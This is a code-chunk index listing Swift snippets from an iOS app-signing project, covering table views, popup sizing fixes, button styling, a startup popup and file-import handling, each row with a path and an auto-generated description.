2380,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","extension AppsInformationViewController - Controls user interface and application flow","extension AppsInformationViewController: UITableViewDelegate, UITableViewDataSource {
func numberOfSections(in _: UITableView) -> Int {"
2381,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function numberOfSections - implements numberofsections functionality","func numberOfSections(in _: UITableView) -> Int {
return sectionTitles.count
}

func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2382,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
return tableData[section].count
}

func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {"
2383,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
return sectionTitles[section]
}

func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {"
2384,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {
return sectionTitles[section].isEmpty ? 5 : 40
}

func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {"
2385,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
let title = sectionTitles[section]
return InsetGroupedSectionHeader(title: title)
}

func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {"
2386,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
switch section {"
2387,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
var cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .none

let cellText = tableData[indexPath.section][indexPath.row]
cell.textLabel?.text = cellText

switch cellText {"
2388,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let itemTapped = tableData[indexPath.section][indexPath.row]

switch itemTapped {"
2389,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift","Extension to fix popup presentation issues","extension PopupViewController {
/// Configures the sheet presentation controller to display the popup properly
/// - Parameter hasUpdate: Whether the popup is displaying an update option
func configureSheetPresentation(hasUpdate: Bool = false) {"
2390,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift","/ Configures the sheet presentation controller to display the popup properly / - Parameter hasUpdate: Whether the popup is displaying an update option","func configureSheetPresentation(hasUpdate: Bool = false) {
if let sheet = sheetPresentationController {"
2391,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift","/ Calculates the required height based on buttons content / - Returns: Appropriate height for the popup sheet","private func calculateRequiredHeight() -> CGFloat {
// Base padding (top and bottom)
let basePadding: CGFloat = 40.0

// Use fixed button count since we can't access the private stackView
let buttonCount = 2 // Default count, adjust if needed for your use case

// Height per button plus spacing
let buttonHeight: CGFloat = 50.0
let buttonSpacing: CGFloat = 8.0 // Default spacing"
2392,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+Fix.swift","/ Enhanced button configuration with proper layout and spacing / - Parameter buttons: Array of buttons to display in popup","func configureButtonsWithLayout(_ buttons: [PopupViewControllerButton]) {
// Use the public interface to configure buttons
configureButtons(buttons)

// Add bottom constraint to ensure proper sizing of the popup
if let lastButton = buttons.last, lastButton.superview != nil {"
2393,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Extension to fix popup menu sizing and presentation issues","extension PopupViewController {
/// Apply essential fixes to prevent crashes and improve functionality
func applyMenuFixes() {"
2394,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Apply essential fixes to prevent crashes and improve functionality","func applyMenuFixes() {
// Fix button layout and sizing
adjustButtonLayout()

// Add LED effects to buttons
applyLEDEffectsToButtons()

// Prevent popup from disappearing during app state changes
setupBackgroundHandling()
"
2395,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Fix sizing and presentation issues with the popup sheet","private func fixSheetPresentation() {
if let sheet = sheetPresentationController {"
2396,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Configure a popup for proper sizing and presentation / - Parameter hasUpdate: Whether this popup contains update options (affects sizing)","func configurePopupDetents(hasUpdate: Bool = false) {
// Get sheet presentation controller if available
if let sheet = sheetPresentationController {"
2397,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Calculate the appropriate height for the popup based on its content / - Parameters: /   - buttonCount: Number of buttons in the popup /   - hasUpdate: Whether this is an update popup (affects sizing) / - Returns: The calculated height","private func calculateRequiredHeight(buttonCount: Int, hasUpdate: Bool) -> CGFloat {
// Base padding (top and bottom margins)
let basePadding: CGFloat = hasUpdate ? 60.0 : 40.0

// Button heights and spacing
let buttonHeight: CGFloat = 50.0
let buttonSpacing: CGFloat = 10.0
let totalButtonsHeight = CGFloat(buttonCount) * buttonHeight
let totalSpacingHeight = CGFloat(max(0, buttonCount - 1)) * buttonSpacing
"
2398,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Adjust button layout to fix oversized menu issues","private func adjustButtonLayout() {
// Set consistent button height
let buttonHeight: CGFloat = 50

// Ensure proper button sizing
for subview in stackView.arrangedSubviews {"
2399,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Configure buttons with proper constraints for popup sizing / - Parameter buttons: Array of buttons to display","func configureButtons(_ buttons: [PopupViewControllerButton]) {
// Remove any existing buttons
stackView.arrangedSubviews.forEach { $0.removeFromSuperview() }"
2400,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Apply LED effects to buttons for better visual appearance","private func applyLEDEffectsToButtons() {
for (index, subview) in stackView.arrangedSubviews.enumerated() {"
2401,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Setup handler for app backgrounding to prevent crashes","private func setupBackgroundHandling() {
// Add notification observers
NotificationCenter.default.addObserver(
self,
selector: #selector(handleAppStateChange),
name: UIApplication.willResignActiveNotification,
object: nil
)

NotificationCenter.default.addObserver("
2402,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Ensure popup doesn't get dismissed inappropriately during app state changes","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Register for app state notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(handleAppDidBecomeActive),
name: UIApplication.didBecomeActiveNotification,
object: nil
)"
2403,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)

// Remove observers when view disappears
NotificationCenter.default.removeObserver(
self,
name: UIApplication.didBecomeActiveNotification,
object: nil
)
}"
2404,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","MARK: - Application State Handling","@objc private func handleAppStateChange(_ notification: Notification) {
if notification.name == UIApplication.willResignActiveNotification {"
2405,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality","@objc private func handleAppDidBecomeActive() {
// Fix presentation issues that might occur when app returns to foreground
if let presentationController = presentationController as? UISheetPresentationController {"
2406,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","MARK: - Sign Button Fix / Fixed implementation for handling app signing that prevents crash / - Parameters: /   - app: The app to sign /   - viewController: The parent view controller","func safeHandleAppSigning(app: NSManagedObject, viewController: UIViewController) {
// Properly dismiss the popup first
dismiss(animated: true) {"
2407,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController+MenuFix.swift","/ Fallback method if we're not using LibraryViewController / - Parameters: /   - app: The app to sign /   - viewController: The view controller to present from","private func fallbackSigningPresentation(for app: NSManagedObject, from viewController: UIViewController) {
// Log fallback
Debug.shared.log(message: ""Using fallback signing presentation"", type: .warning)

// Create signing options with current user defaults
let signingDataWrapper = SigningDataWrapper(signingOptions: UserDefaults.standard.signingOptions)

// If we can cast to DownloadedApps, proceed with signing
if let downloadedApp = app as? DownloadedApps,
let libraryVC = viewController.navigationController?.viewControllers"
2408,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","class PopupViewController - Controls user interface and application flow","class PopupViewController: UIViewController {
// Changed from private to fileprivate to allow access from extensions in same file
// Use internal (default) access level to allow access from other files
let stackView = UIStackView()

override func viewDidLoad() {"
2409,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
view.backgroundColor = .systemBackground
setupStackView()
}

private func setupStackView() {"
2410,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function setupStackView - sets upstackview","private func setupStackView() {
stackView.axis = .vertical
stackView.spacing = 10
stackView.alignment = .fill
stackView.distribution = .fillEqually
stackView.translatesAutoresizingMaskIntoConstraints = false

view.addSubview(stackView)

NSLayoutConstraint.activate(["
2411,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function configureButtons - implements configurebuttons functionality","func configureButtons(_ buttons: [UIButton]) {
stackView.arrangedSubviews.forEach { $0.removeFromSuperview() }"
2412,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","class PopupViewControllerButton - implements functionality related to popup view controller button","class PopupViewControllerButton: UIButton {
// MARK: - Properties

var onTap: (() -> Void)?
private var originalBackgroundColor: UIColor?
private let feedbackGenerator = UIImpactFeedbackGenerator(style: .medium)
private let gradientLayer = CAGradientLayer()

// MARK: - Initialization
"
2413,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","MARK: - Setup Methods","private func addButtonTargets() {
addTarget(self, action: #selector(handleButtonPressEvent), for: .touchDown)
addTarget(self, action: #selector(handleButtonReleaseEvent), for: .touchUpInside)
addTarget(self, action: #selector(handleButtonReleaseEvent), for: .touchUpOutside)
addTarget(self, action: #selector(buttonCancelled), for: .touchCancel)
addTarget(self, action: #selector(buttonTapped), for: .touchUpInside)
}

private func setupButton(title: String, color: UIColor, titlecolor: UIColor) {"
2414,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function setupButton - sets upbutton","private func setupButton(title: String, color: UIColor, titlecolor: UIColor) {
// Store original color
originalBackgroundColor = color

// Basic appearance
setTitle(title, for: .normal)
setTitleColor(titlecolor, for: .normal)
titleLabel?.font = UIFont.systemFont(ofSize: 16, weight: .semibold)

// Modern shape with continuous corners"
2415,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function setupGradient - sets upgradient","private func setupGradient(withBaseColor color: UIColor) {
// Create a subtle gradient variation of the base color
let topColor = color.lighter(by: 10).cgColor
let bottomColor = color.darker(by: 10).cgColor

gradientLayer.colors = [topColor, bottomColor]
gradientLayer.locations = [0.0, 1.0]
gradientLayer.startPoint = CGPoint.zero
gradientLayer.endPoint = CGPoint(x: 0.0, y: 1.0)
gradientLayer.frame = bounds"
2416,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function colorIsCloseToAccent - implements colorisclosetoaccent functionality","private func colorIsCloseToAccent(_ color: UIColor) -> Bool {
// Check if the color is similar to our accent color
let accentColor = UIColor(hex: ""#FF6482"")

var r1: CGFloat = 0, g1: CGFloat = 0, b1: CGFloat = 0, a1: CGFloat = 0
var r2: CGFloat = 0, g2: CGFloat = 0, b2: CGFloat = 0, a2: CGFloat = 0

color.getRed(&r1, green: &g1, blue: &b1, alpha: &a1)
accentColor.getRed(&r2, green: &g2, blue: &b2, alpha: &a2)
"
2417,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","MARK: - Action Methods","@objc func handleButtonPressEvent() {
// Visual feedback
UIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut], animations: {"
2418,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function handleButtonReleaseEvent - implements handlebuttonreleaseevent functionality","@objc func handleButtonReleaseEvent() {
// Visual feedback
UIView.animate(
withDuration: 0.2,
delay: 0,
usingSpringWithDamping: 0.7,
initialSpringVelocity: 0.5,
options: [],
animations: {"
2419,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function buttonCancelled - implements buttoncancelled functionality","@objc private func buttonCancelled() {
// Reset button state without animation
transform = .identity
layer.shadowOpacity = 0.2
alpha = 1.0

if gradientLayer.superlayer != nil {"
2420,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function buttonTapped - implements buttontapped functionality","@objc private func buttonTapped() {
// Provide haptic feedback
feedbackGenerator.impactOccurred()

// Call the callback
onTap?()
}

// MARK: - Lifecycle
"
2421,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","MARK: - Lifecycle","override func layoutSubviews() {
super.layoutSubviews()
gradientLayer.frame = bounds
}
}

// Helper color extensions - only isLight() is needed here since lighter/darker are already defined
// Use fileprivate to avoid conflicts with other extensions
private extension UIColor {"
2422,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Helper color extensions - only isLight() is needed here since lighter/darker are already defined Use fileprivate to avoid conflicts with other extensions","private extension UIColor {
func isLight() -> Bool {"
2423,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Function isLight - checks if light","func isLight() -> Bool {
var red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0
getRed(&red, green: &green, blue: &blue, alpha: &alpha)

// Calculate relative luminance
let luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue
return luminance > 0.5
}
}
"
2424,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/PopupViewController.swift","Helper method to keep original functionality but avoid extension conflicts","private func isColorLight(_ color: UIColor) -> Bool {
var red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0
color.getRed(&red, green: &green, blue: &blue, alpha: &alpha)

// Calculate relative luminance
let luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue
return luminance > 0.5
}
"
2425,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","/ A popup that displays for exactly 5 seconds on first app launch","class StartupPopupViewController: UIViewController {
// MARK: - UI Components

private let contentView = UIView()
private let titleLabel = UILabel()
private let messageLabel = UILabel()
private let iconImageView = UIImageView()
private let progressView = UIProgressView()
private let secondsRemainingLabel = UILabel()
"
2426,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
// Make sure the view is properly accessible
view.isUserInteractionEnabled = true
view.accessibilityIdentifier = ""StartupPopupView""
}

override func viewDidAppear(_ animated: Bool) {"
2427,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","Function viewDidAppear - implements viewdidappear functionality","override func viewDidAppear(_ animated: Bool) {
super.viewDidAppear(animated)

// Start the timer when the view appears
startTime = Date()
startProgressTimer()

// Schedule automatic dismissal after exactly 5 seconds
DispatchQueue.main.asyncAfter(deadline: .now() + displayDuration) { [weak self] in"
2428,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)
// Always invalidate timer to prevent leaks
timer?.invalidate()
timer = nil
}

deinit {"
2429,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","MARK: - UI Setup","private func setupUI() {
// Main view configuration - semi-transparent black background
view.backgroundColor = UIColor.black.withAlphaComponent(0.7)

// Content view setup - white card with shadow
contentView.backgroundColor = .systemBackground
contentView.layer.cornerRadius = 16
contentView.layer.shadowColor = UIColor.black.cgColor
contentView.layer.shadowOpacity = 0.3
contentView.layer.shadowOffset = CGSize(width: 0, height: 4)"
2430,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
contentView.translatesAutoresizingMaskIntoConstraints = false
iconImageView.translatesAutoresizingMaskIntoConstraints = false
titleLabel.translatesAutoresizingMaskIntoConstraints = false
messageLabel.translatesAutoresizingMaskIntoConstraints = false
progressView.translatesAutoresizingMaskIntoConstraints = false
secondsRemainingLabel.translatesAutoresizingMaskIntoConstraints = false

NSLayoutConstraint.activate([
// Content view constraints - centered with fixed width"
2431,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","MARK: - Timer Management","private func startProgressTimer() {
// Update progress every 0.1 seconds
timer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in"
2432,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","Function dismissPopup - implements dismisspopup functionality","private func dismissPopup() {
// Check if dismissal is already in progress to prevent multiple calls
guard !dismissInProgress else { return }"
2433,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","MARK: - Actions Add a method to manually dismiss if needed","@objc func handleDismissTap() {
dismissPopup()
}

// MARK: - Overrides

override func touchesBegan(_ touches: Set<UITouch>, with _: UIEvent?) {"
2434,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Popups/StartupPopupViewController.swift","MARK: - Overrides","override func touchesBegan(_ touches: Set<UITouch>, with _: UIEvent?) {
// Allow touches only on certain areas if needed
if let touch = touches.first {"
2435,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","struct TransferPreview - implements functionality related to transfer preview","struct TransferPreview: View {
@Environment(\.presentationMode) var presentationMode

@StateObject private var installer: Installer

@State private var appPath: String
@State private var appName: String
@State private var isSharing: Bool = false

@State private var packaging: Bool = true"
2436,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","Function archivePayload - implements archivepayload functionality","func archivePayload(at filePath: String, with fileName: String, completion: @escaping (URL?) -> Void) {
DispatchQueue.global(qos: .userInitiated).async {"
2437,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","struct ActivityViewController - Controls user interface and application flow","struct ActivityViewController: UIViewControllerRepresentable {
var activityItems: [Any]
var applicationActivities: [UIActivity]?

func makeUIViewController(context _: UIViewControllerRepresentableContext<Self>) -> UIActivityViewController {"
2438,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","Function makeUIViewController - implements makeuiviewcontroller functionality","func makeUIViewController(context _: UIViewControllerRepresentableContext<Self>) -> UIActivityViewController {
return UIActivityViewController(activityItems: activityItems, applicationActivities: applicationActivities)
}

func updateUIViewController(_: UIActivityViewController, context _: UIViewControllerRepresentableContext<Self>) {}"
2439,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","Function updateUIViewController - updates uiviewcontroller","func updateUIViewController(_: UIActivityViewController, context _: UIViewControllerRepresentableContext<Self>) {}
}

struct SafariWebView: UIViewControllerRepresentable {"
2440,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","struct SafariWebView - UI component for display and interaction","struct SafariWebView: UIViewControllerRepresentable {
let url: URL

func makeUIViewController(context _: Context) -> SFSafariViewController {"
2441,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","Function makeUIViewController - implements makeuiviewcontroller functionality","func makeUIViewController(context _: Context) -> SFSafariViewController {
return SFSafariViewController(url: url)
}

func updateUIViewController(_: SFSafariViewController, context _: Context) {"
2442,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Extra/Previews/TransferPreview.swift","Function updateUIViewController - updates uiviewcontroller","func updateUIViewController(_: SFSafariViewController, context _: Context) {
//
}
}
"
2443,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController+Initialization.swift","extension DirectoryViewController - Controls user interface and application flow","extension DirectoryViewController {
/// Initialize with a directory URL and title
/// - Parameters:
///   - directoryURL: The URL of the directory to display
///   - title: The title to display in the navigation bar
convenience init(directoryURL: URL, title: String) {"
2444,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController.swift","class DirectoryViewController - Controls user interface and application flow","class DirectoryViewController: HomeViewController {
// MARK: - Properties

/// The directory URL this controller is showing
private var directoryURL: URL

/// Callback to notify parent when changes occur
var onContentChanged: (() -> Void)?

// MARK: - Initialization"
2445,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupFileManagementUI() // Call the setup method from the extension
}

// MARK: - Overrides

/// Override documentsDirectory to use the specified directory URL
override var documentsDirectory: URL {"
2446,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewController.swift","/ Reload content when returning to view","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
loadFiles()
}
}
"
2447,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift","MARK: - Extensions to provide all-in-one comprehensive file management","extension DirectoryViewController {
/// Set up the file management UI elements
func setupFileManagementUI() {"
2448,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift","/ Set up the file management UI elements","func setupFileManagementUI() {
// Add edit button for quick file creation
navigationItem.rightBarButtonItem = UIBarButtonItem(
barButtonSystemItem: .add,
target: self,
action: #selector(showAddFileOptions)
)
}

@objc private func showAddFileOptions() {"
2449,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift","Function showAddFileOptions - implements showaddfileoptions functionality","@objc private func showAddFileOptions() {
let alertController = UIAlertController(
title: ""Add New"",
message: ""What would you like to create?"",
preferredStyle: .actionSheet
)

// New folder option
let folderAction = UIAlertAction(title: ""New Folder"", style: .default) { [weak self] _ in"
2450,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift","/ Take a photo and save it to the current directory","private func takePhoto() {
if UIImagePickerController.isSourceTypeAvailable(.camera) {"
2451,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift","MARK: - UIImagePickerControllerDelegate","extension DirectoryViewController: UIImagePickerControllerDelegate, UINavigationControllerDelegate {
func imagePickerController(
_ picker: UIImagePickerController,
didFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey: Any]
) {"
2452,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/DirectoryViewControllerExtensions.swift","Function imagePickerController - implements imagepickercontroller functionality","func imagePickerController(
_ picker: UIImagePickerController,
didFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey: Any]
) {"
2453,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Extension to fix file upload functionality in Home tab","extension HomeViewController {
/// Enhanced file import function with improved security-scoped resource handling
@objc func enhancedImportFile() {"
2454,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Enhanced file import function with improved security-scoped resource handling","@objc func enhancedImportFile() {
// Improved security-scoped resource access with proper feedback
let documentTypes = [
UTType.item,
UTType.content,
UTType.compositeContent,
UTType.archive,
UTType.zip,
UTType.data,
]"
2455,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Apply LED effects to document picker for better visibility","private func addLEDEffectsToDocumentPicker(_ picker: UIDocumentPickerViewController) {
// We need to wait until the picker is presented to apply effects
DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {"
2456,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Fixed implementation for document picker delegate method Renamed to avoid conflict with base implementation","func documentPickerExtension(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
// Enable activity indicator to show loading state
activityIndicator.startAnimating()

// Process documents in background to keep UI responsive
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2457,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Process a single imported file","private func processImportedFile(url: URL) throws {
// Get a unique filename that won't conflict with existing files
let fileName = HomeViewController.getUniqueFileNameShared(for: url.lastPathComponent)
let destinationURL = documentsDirectory.appendingPathComponent(fileName)

Debug.shared.log(message: ""Processing import: \(url.path) to \(destinationURL.path)"", type: .info)

// Create files directory if needed
try FileManager.default.createDirectory(
at: documentsDirectory,"
2458,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Show a success message with LED effect","private func showLEDSuccessMessage(count: Int) {
let message = count == 1 ? ""File imported successfully"" : ""\(count) files imported successfully""
showLEDIndicator(type: .success, message: message)
}

/// Show an error message with LED effect
private func showLEDErrorMessage(failures: [String]) {"
2459,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Show an error message with LED effect","private func showLEDErrorMessage(failures: [String]) {
let message = failures
.count == 1 ? ""Failed to import file: \(failures.first ?? """")"" : ""Failed to import \(failures.count) files""
showLEDIndicator(type: .error, message: message)

// For multiple failures, also show a detailed report
if failures.count > 1 {"
2460,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Show a mixed result message with LED effect","private func showLEDMixedResultMessage(successes: Int, failures: Int) {
let message = ""Imported \(successes) files successfully, \(failures) failed""
showLEDIndicator(type: .warning, message: message)
}

/// Show an LED indicator with message
private func showLEDIndicator(type: LEDIndicatorType, message: String) {"
2461,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Show an LED indicator with message","private func showLEDIndicator(type: LEDIndicatorType, message: String) {
// Create container view
let container = UIView()
